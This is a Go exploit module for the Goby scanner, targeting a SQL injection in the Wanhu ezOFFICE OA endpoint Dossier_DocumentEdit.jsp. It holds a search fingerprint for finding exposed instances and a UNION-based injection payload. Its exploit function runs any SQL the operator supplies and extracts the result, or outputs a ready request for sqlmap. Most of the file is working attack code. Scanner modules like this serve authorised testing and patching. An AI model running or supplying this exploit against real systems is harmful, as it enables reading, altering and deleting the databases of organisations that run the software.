package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OA /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit SQL Injection Vulnerability",
    "Description": "<p>Wanhu Software Network is a widely recognized smart government office expert in the industry, the leader of the national industry standard compilation unit of OA system, and the leader unit of the national industry standard compilation of collaborative software, focusing on the field of collaborative management for 22 years. Provide you with customized smart government integrated office solutions</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2024-09-23",
    "PostTime": "2024-09-24",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\" || body=\"/defaultroot/ipad/\" || body=\"/defaultroot/scripts/main/whir.validation.js\" || header=\"OASESSIONID\")",
    "GobyQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\" || body=\"/defaultroot/ipad/\" || body=\"/defaultroot/scripts/main/whir.validation.js\" || header=\"OASESSIONID\")",
    "Level": "1",
    "Impact": "<p>There is a SQL injection vulnerability in the OA-ezOFFICE Dossier_DocumentEdit.jsp interface, which can manipulate the server's database. This means that criminals can exploit this vulnerability to gain full control of the database and view, modify, or even delete the data in the database, seriously threatening the security of the system.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version:  </p><p> 2. Deploy a web application firewall.  </p><p> 3. If it is not necessary, it is forbidden to access the system on the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "model",
            "type": "select",
            "value": "Custom,sqlpoint",
            "show": ""
        },
        {
            "name": "Custom",
            "type": "input",
            "value": "pi()",
            "show": "model=Custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28pi%28%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+11",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3.1415",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "万户OA /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit SQL 注入漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户软件网络是业内普遍认可的智慧政务办公专家,OA系统国家行业标准编制组长单位,协同软件国家行业标准编制组长单位,22年专注协同管理领域.为您提供定制化的智慧政务一体化办公解决方案<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：&nbsp;</p><p>2、部署Web应用防火墙。&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>万户OA-ezOFFICE Dossier_DocumentEdit.jsp 接口存在一个 SQL 注入漏洞，通过这个漏洞可以操纵服务器的数据库。这意味着不法分子可以利用这个漏洞来获取对数据库的完全控制权，从而查看、修改甚至删除数据库中的数据，严重威胁系统的安全性。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "OA /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit SQL Injection Vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Wanhu Software Network is a widely recognized smart government office expert in the industry, the leader of the national industry standard compilation unit of OA system, and the leader unit of the national industry standard compilation of collaborative software, focusing on the field of collaborative management for 22 years. Provide you with customized smart government integrated office solutions<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version:&nbsp;&nbsp;</p><p>&nbsp;2. Deploy a web application firewall.&nbsp;&nbsp;</p><p>&nbsp;3. If it is not necessary, it is forbidden to access the system on the public network.<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the OA-ezOFFICE Dossier_DocumentEdit.jsp interface, which can manipulate the server's database. This means that criminals can exploit this vulnerability to gain full control of the database and view, modify, or even delete the data in the database, seriously threatening the security of the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9956"
}`
	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(%s),NULL,NULL,NULL,NULL,NULL,NULL-- 1", sql)
		urlget := "/defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID=" + url.QueryEscape(rawPayload)
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID="

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "3.1415"

			sql := "pi()"

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28pi%28%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+11 HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9\n" +
				"Upgrade-Insecure-Requests: 1\n\n"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `name="FileType" value="([^"]+)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["model"])
			if attacktype == "Custom" {
				sql := goutils.B2S(ss.Params["Custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "获取到相关信息\n" + output
			}else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
